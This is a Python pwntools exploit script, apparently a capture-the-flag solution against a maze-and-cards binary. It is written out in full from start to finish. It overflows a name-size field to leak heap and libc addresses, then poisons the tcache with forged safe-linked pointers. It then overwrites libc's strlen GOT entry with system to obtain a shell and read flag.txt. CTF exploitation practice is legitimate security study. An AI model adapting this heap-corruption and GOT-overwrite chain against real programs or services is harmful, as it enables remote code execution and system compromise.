#!/usr/bin/env python3
import struct
import sys
from pwn import *

HOST = sys.argv[1]
PORT = sys.argv[2]
exe = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
io = remote(HOST, int(PORT))

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def send(c):
    if len(c) == 1:
        io.sendlineafter(b')\n', c)
    else:
        for x in c:
            io.sendlineafter(b')\n', p8(x))

def edit_maze():
    send(b'e')
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b': ', b'16')
    io.sendlineafter(b':', '''############## #
#              #
######## #######'''.encode())
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', b'1 2 0 14')
    io.sendlineafter(b': ', b'1 1')

def encrypt(ptr, addr):
    return ptr ^ (addr >> 12)

def edit_name(name, t):
    if t == 2:
        io.sendlineafter(b': ', b'i')
    else:
        send(b'i')
    io.sendlineafter(b') : ', b'y')
    io.sendafter(b': ', name)


io.sendlineafter(b': ', b'a')
cmd(1)
edit_maze()

send(b'd'+b'w'*8+b'a'*13+b'wwa') # rewrite name_sz

cmd(1) # fill space between name and heap address with ' '
send(b'd'+b'w'*8+b'd')
cmd(1)
send(b'd'+b'w'*7+b'd')
cmd(1)
send(b'd'+b'w'*6+b'd')
cmd(1)
send(b'd'+b'w'*6+b'a'*14)
cmd(1)
send(b'd'+b'w'*7+b'a'*14)

cmd(3)
io.recvuntil(b'Q'+b' '*7)
heap = unpack(io.recvline()[:-1], 'all') * 0x1000 + 0x300
print('[+] heap: ', hex(heap))
io.sendlineafter(b') : ', b'n')

#         | 0x21
#   left  | right
#  k  | p | 
node = struct.Struct('<QQQii')

pref = b'a'*0x28 + p64(0x51) + p64(heap>>12) + b'a'*0x40 + p64(0x41) + b'a'*0x38

pl = pref
for i in range(5):
    pl += node.pack(0x21, 0, 0, i, 0) # my cards
pl += node.pack(0x21, 0, 0, 1, 0) * 5 # bot cards
pl += p64(0x21) + p64(encrypt(heap-0x60, heap+0x1d0)) # 4th chunk in tcache

cmd(2)
edit_name(pl, 2)

io.sendlineafter(b': ', b'l') # find root node
io.recvuntil(b': ')
x = int(io.recvline())

heap += 0x90
pl = pref
if x < 3:
    for i in range(x):
        pl += node.pack(0x21, 0, 0, i, 0) # my cards
    pl += node.pack(0x21, 0, heap+(x+1)*0x20, x, 0)
    pl += node.pack(0x21, 0, heap+(x+2)*0x20, x+1, 0)
    for i in range(x+2, 5):
        pl += node.pack(0x21, 0, 0, i, 0)
elif x == 3:
    pl += node.pack(0x21, 0, 0, 5, 0)
    pl += node.pack(0x21, 0, 0, 1, 0)
    pl += node.pack(0x21, 0, 0, 2, 0)
    pl += node.pack(0x21, 0, heap+0x20*4, 3, 0)
    pl += node.pack(0x21, 0, heap, 4, 0)
elif x == 4:
    pl += node.pack(0x21, 0, heap+0x20, 5, 0)
    pl += node.pack(0x21, 0, 0, 6, 0)
    pl += node.pack(0x21, 0, 0, 2, 0)
    pl += node.pack(0x21, 0, 0, 3, 0)
    pl += node.pack(0x21, 0, heap, 4, 0)

pl += node.pack(0x21, 0, 0, 1, 0)*5  # bot cards
edit_name(pl, 2)

io.sendlineafter(b': ', str(x+2).encode())  # trigger mallocs in `split` to put chunk with user struct in tcache
io.sendlineafter(b': ', b'q')
cmd(1)
io.sendlineafter(b')\n', b'e') # rewrite user struct
io.sendlineafter(b': ', b'4')
io.sendlineafter(b': ', b'8')
io.sendlineafter(b':', p64(0)+b'\n'+p64(0)+b'\n'+p64(0x1000)+b'\n'+p64(exe.sym['stdin']))

send(b'i')
io.recvuntil(b': ')
libc.address = unpack(io.recv(6), 'all') - libc.sym['_IO_2_1_stdin_']
print('[+] libc: ', hex(libc.address))
io.sendlineafter(b') : ', b'n')

pl = flat([
    libc.sym['_IO_2_1_stdin_'], 0,
    u64(p32(4)+p32(0x10)), heap+0x50,
    0, 0,
    exe.sym['stdin']+0x40, 0,
    0, 0,  # fake user struct,
    0x1000, libc.address+0x219090 # strlen.got-8
], word_size=64)
edit_name(pl, 1)

edit_name(b'/bin/sh\0' + p64(libc.sym.system), 1)
send(b'i')

io.sendline(b'cat flag.txt')

io.interactive()
